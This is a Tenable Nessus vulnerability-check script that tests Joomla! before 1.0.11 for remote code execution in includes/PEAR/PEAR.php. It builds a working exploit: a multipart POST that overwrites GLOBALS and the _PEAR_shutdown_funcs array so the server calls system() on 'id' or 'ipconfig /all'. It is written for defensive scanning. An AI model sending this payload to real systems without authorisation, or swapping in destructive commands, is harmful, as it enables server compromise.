#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22298);
  script_version("$Revision: 1.28 $");
  script_cvs_date("$Date: 2017/05/19 13:58:06 $");

  script_cve_id("CVE-2005-3390", "CVE-2006-4469");
  script_bugtraq_id(15250, 19749);
  script_osvdb_id(20408, 28341);

  script_name(english:"Joomla! < 1.0.11 Unspecified Remote Code Execution");
  script_summary(english:"Attempts to run a command on the host.");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote code execution vulnerability.");
 script_set_attribute(attribute:"description", value:
"The version of Joomla! installed on the remote host is affected by a
remote code execution vulnerability in the includes/PEAR/PEAR.php
script. An unauthenticated, remote attacker can exploit this to
execute arbitrary code, subject to the privileges of the web server
user ID.

Note that successful exploitation of this vulnerability requires that
the PHP 'register_globals' setting be enabled and that the remote
version of PHP be older than 4.4.1 or 5.0.6.");
  # http://www.hardened-php.net/globals_overwite_and_its_consequences.76.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?304cf490");
  # http://web.archive.org/web/20080701014536/http://www.joomla.org/content/view/1843/74/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9c6f8af3");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! version 1.0.11 or later. Alternatively, upgrade to
PHP version 4.4.1 / 5.0.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:X/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/10/31");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/08/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/09/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);

# Make sure the affected script exists.
url = dir + "/includes/PEAR/PEAR.php";
r = http_send_recv3(
  method : "GET",
  item   : url,
  port   : port,
  exit_on_fail : TRUE
);

# If it does...
# nb: the script generally doesn't respond when called directly.
if (!egrep(string:r[0], pattern:"^HTTP/.* 200 OK"))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';
  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask|IP(v(4|6)?)? Address";

foreach cmd (cmds)
{
  vuln = FALSE;
  # Try to exploit the flaw to execute a command.
  bound = "bound";

  boundary = "--" + bound;
  postdata =
    boundary + '\r\n' +
    'Content-Disposition: form-data; name="GLOBALS"; filename="nessus";' +
    '\r\n' +
    'Content-Type: image/jpeg;\r\n' +
    '\r\n' + SCRIPT_NAME + '\r\n' +
    boundary + '\r\n' +
    'Content-Disposition: form-data; name="_PEAR_shutdown_funcs[a][0]"' +
    '\r\n' +
    'Content-Type: text/plain\r\n' +
    '\r\n' +
    'system\r\n' +
    boundary + '\r\n' +
    'Content-Disposition: form-data; name="_PEAR_shutdown_funcs[a][1]"' +
    '\r\n' +
    'Content-Type: text/plain\r\n' +
    '\r\n' + cmd + '\r\n' +
    boundary +
    '--\r\n';

  r = http_send_recv3(
    method  : "POST",
    item    : url,
    data    : postdata,
    port    : port,
    content_type : "multipart/form-data; boundary="+bound,
    exit_on_fail : TRUE
  );

  line = egrep(pattern:cmd_pats[cmd], string:r[2]);
  if (!empty_or_null(line))
  {
    vuln = TRUE;
    output = chomp(r[2]);
    break;
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  cmd         : cmd,
  request     : make_list(http_last_sent_request()),
  output      : output
);
exit(0);
